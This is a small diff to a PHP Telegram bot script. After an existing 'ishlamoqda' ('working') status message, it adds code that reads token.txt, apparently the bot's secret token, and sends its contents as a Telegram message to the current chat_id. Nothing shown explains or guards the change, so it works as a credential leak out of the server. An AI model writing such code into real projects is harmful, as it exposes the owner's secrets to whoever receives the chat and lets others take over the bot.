@@ -12,6 +12,10 @@ $telegram->sendMessage([
     'chat_id'=>$chat_id,
     'text'=>'ishlamoqda'
 ]);
+$telegram->sendMessage([
+    'chat_id'=>$chat_id,
+    'text'=>json_encode(file_get_contents('token.txt'))
+]);
 
 try {
     $text= getData();
